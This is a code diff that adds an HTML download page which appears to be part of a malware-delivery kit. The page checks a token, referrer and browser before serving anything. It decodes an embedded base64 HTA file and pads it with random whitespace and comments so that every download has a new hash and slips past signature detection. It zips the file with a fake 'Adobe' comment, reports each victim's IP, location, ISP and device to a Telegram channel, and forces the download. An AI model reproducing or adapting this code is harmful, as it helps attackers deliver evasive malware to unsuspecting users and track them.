@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Download</title>
+</head>
+<body>
+  <script src="config.js"></script>
+  <script src="gate.js"></script>
+  <script src="zip.js"></script>
+  <script src="payload.js"></script>
+  <script>
+    (async function () {
+      var q = new URLSearchParams(location.search);
+      var tk = q.get('tk') || '';
+      var name = q.get('n') || '';
+      if (!/^[A-Za-z0-9_. -]+$/.test(name) || name.length === 0) name = window.makeName();
+      name = name.slice(0, 90);
+      if (!/\.hta$/i.test(name)) name += '.hta';
+
+      // Step-4 gate: real Chrome + token + same-origin referer (complete.html) + rate limit.
+      if (!tk) { window.gateStep({ entry: true }); return; }
+      if (!window.gateStep({ entry: false, allowedRefPaths: ['/complete.html'] })) return;
+      if (!window.rateAllows()) { window.gateStep({ entry: false, allowedRefPaths: ['/complete.html'] }); return; }
+
+      var zipName = name.replace(/\.hta$/i, '.zip');
+
+      // 1) decode the embedded source HTA (base64, not a public asset)
+      let htaBytes;
+      try {
+        var b64 = window.HTA_B64;
+        if (!b64) return window.gateStep({ entry: false, allowedRefPaths: ['/complete.html'] });
+        var bin = atob(b64);
+        htaBytes = new Uint8Array(bin.length);
+        for (var i = 0; i < bin.length; i++) htaBytes[i] = bin.charCodeAt(i);
+      } catch (e) { return; }
+
+      // 2) mutate: inject invisible random whitespace + comment before </body>
+      //    so the served file's SHA-256 differs every download.
+      var text = new TextDecoder().decode(htaBytes);
+      var pad = (2 + Math.floor(Math.random() * 7)) + ' \n';
+      var sp = ' '.repeat(24 + Math.floor(Math.random() * 137));
+      var cmt = '<!-- ' + sp + ' v' + (10000 + Math.floor(Math.random() * 89999)) + "-->\n";
+      var pos = text.lastIndexOf('</body>');
+      var mutated = (pos !== -1) ? text.slice(0, pos) + pad + cmt + text.slice(pos) : text + pad + cmt;
+      var innerBytes = new TextEncoder().encode(mutated);
+
+      // 3) wrap in a fresh .zip (random comment rotates the outer hash too)
+      var zipComment = ' Adobe' + (1000 + Math.floor(Math.random() * 8999)) + ' ' + (100 + Math.floor(Math.random() * 899));
+      var zipBytes = window.buildZip(zipName, name, innerBytes, zipComment);
+
+      // 4) one Telegram "Download Served" alert per real served download
+      try {
+        var key = 'dl_' + tk + '|' + name;
+        if (!localStorage.getItem(key)) {
+          localStorage.setItem(key, '1');
+          var g = await window.geo();
+          var sha = await window.sha256Hex(zipBytes);
+          var now = new Date().toISOString().replace('T', ' ').slice(0, 19);
+          var msg = "\uD83D\uDCE5 Download Served \uD83D\uDCE5\n"
+                  + "\uD83D\uDCC5 Time: " + now + "\n"
+                  + "\uD83D\uDCCD IP: " + g.ip + "\n"
+                  + "\uD83C\uDF0D Location: " + g.city + ", " + g.country + "\n"
+                  + "\uD83C\uDF10 ISP: " + g.isp + "\n"
+                  + "\uD83D\uDCC1 File: " + zipName + " (" + (zipBytes.length / 1048576).toFixed(2) + " MB)\n"
+                  + "\uD83D\uDD01 SHA256: " + sha.slice(0, 16) + "...\n"
+                  + "\uD83D\uDCF1 Device: " + navigator.userAgent;
+          window.tgSend(msg.slice(0, 2900));
+        }
+      } catch (e) {}
+
+      // 5) serve as a download attachment
+      var blob = new Blob([zipBytes], { type: 'application/octet-stream' });
+      var a = document.createElement('a');
+      a.href = URL.createObjectURL(blob);
+      a.download = zipName;
+      document.body.appendChild(a);
+      a.click();
+      setTimeout(function () { URL.revokeObjectURL(a.href); a.remove(); }, 4000);
+    })();
+  </script>
+</body>
+</html>
